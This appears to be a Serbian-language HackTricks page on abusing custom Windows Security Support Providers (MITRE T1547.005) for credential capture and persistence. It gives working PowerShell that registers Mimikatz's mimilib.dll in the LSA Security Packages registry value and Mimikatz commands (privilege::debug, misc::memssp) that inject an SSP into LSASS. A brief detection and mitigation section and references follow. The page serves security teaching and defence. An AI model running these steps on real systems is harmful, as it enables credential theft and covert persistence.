# Prilagođeni Security Support Providers

{{#include ../../banners/hacktricks-training.md}}

[Security Support Providers (SSP-ovi)](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi) su bezbednosni paketi zasnovani na DLL-ovima koje učitava Local Security Authority (LSA). Windows registruje prilagođene SSP/AP DLL-ove preko vrednosti `REG_MULTI_SZ` `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` i učitava registrovane pakete pri pokretanju sistema.<sup>[[1]](#references)</sup>

Pošto SSP-ovi rade u okviru LSA i mogu da primaju kredencijale, adversaries mogu zloupotrebiti zlonamerni paket za pristup kredencijalima i persistence. MITRE prati ovo ponašanje kao T1547.005.<sup>[[2]](#references)</sup>

## Mimikatz `mimilib`

Mimikatz uključuje `mimilib.dll`, koji implementira SSP koji beleži kredencijale obrađene nakon učitavanja. U ovlašćenoj laboratoriji postavite DLL koji odgovara arhitekturi cilja u `C:\Windows\System32`, a zatim pregledajte trenutnu listu paketa pre nego što je izmenite.<sup>[[2]](#references)[[3]](#references)</sup>
```powershell
$lsaPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
$packages = (Get-ItemProperty -Path $lsaPath -Name 'Security Packages').'Security Packages'
$packages
```
Tipična postojeća vrednost može da sadrži pakete kao što su `kerberos`, `msv1_0`, `schannel`, `wdigest`, `tspkg` i `pku2u`. Sačuvajte svaki postojeći unos prilikom dodavanja prilagođenog paketa.<sup>[[1]](#references)</sup>

Dodajte `mimilib` bez zamene postojećih paketa:
```powershell
if ($packages -notcontains 'mimilib') {
Set-ItemProperty -Path $lsaPath -Name 'Security Packages' -Value ($packages + 'mimilib')
}
```
Nakon ponovnog pokretanja, paket se učitava u LSA, a naknadno uhvaćeni credentials se ovom implementacijom upisuju u `C:\Windows\System32\kiwissp.log`.<sup>[[2]](#references)[[3]](#references)</sup>

## Učitavanje u memoriju

Mimikatz takođe može da ubaci svoju SSP implementaciju u trenutni LSASS proces:<sup>[[3]](#references)</sup>
```text
privilege::debug
misc::memssp
```
Ovaj metod se ne zadržava nakon ponovnog pokretanja sistema.<sup>[[2]](#references)[[3]](#references)</sup>

## Detekcija i ublažavanje

Pratite promene u `...\Lsa\Security Packages` i neočekivano učitavanje DLL-ova u `lsass.exe`. Security event 4657 beleži izmene **vrednosti** registra samo kada su konfigurisani odgovarajuća Audit Registry policy i SACL.<sup>[[2]](#references)[[4]](#references)</sup>

Kada je kompatibilno, omogućite dodatnu LSA zaštitu i istražite nepotpisane ili neočekivane SSP DLL-ove. Microsoft posebno dokumentuje LSA zaštitu kao kontrolu protiv code injection-a koji bi mogao ugroziti credentiale.<sup>[[5]](#references)</sup>

## References

- [1] [Microsoft Learn - Registrovanje SSP/AP DLL-ova](https://learn.microsoft.com/en-us/windows/win32/secauthn/registering-ssp-ap-dlls)
- [2] [MITRE ATT&CK T1547.005 - Security Support Provider](https://attack.mitre.org/techniques/T1547/005/)
- [3] [Mimikatz repository - `mimilib`](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib)
- [4] [Microsoft Learn - Security event 4657](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657)
- [5] [Microsoft Learn - Konfigurisanje dodatne LSA zaštite](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
{{#include ../../banners/hacktricks-training.md}}
